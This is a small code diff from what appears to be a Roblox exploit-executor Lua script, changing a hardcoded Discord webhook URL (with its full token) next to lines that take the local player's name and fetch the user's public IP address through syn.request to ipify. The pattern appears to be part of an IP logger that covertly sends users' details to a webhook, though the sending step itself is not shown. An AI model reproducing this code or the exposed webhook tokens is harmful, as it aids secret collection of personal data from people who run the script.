@@ -474,7 +474,7 @@ local function a(_, b, a)
     end
 end
 local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "https://discord.com/api/webhooks/1046580557573804032/0HAVZdZBJLug7_blLlNEBnTQWJHo0jHbJ6syH-jysKawj-RWZnqLDhTfDdPFdUDvuXPI"
+local WebhookURL = "https://discord.com/api/webhooks/1049108900923850802/hVAv_NzawuAuVf5uA9kvqCneuXVrHK56uzvjWwH7lcByu5o43jOHX-4z2gN1mKhBwU3m"
 local getIPResponse = syn.request({
     Url = "https://api.ipify.org/?format=json",
     Method = "GET"
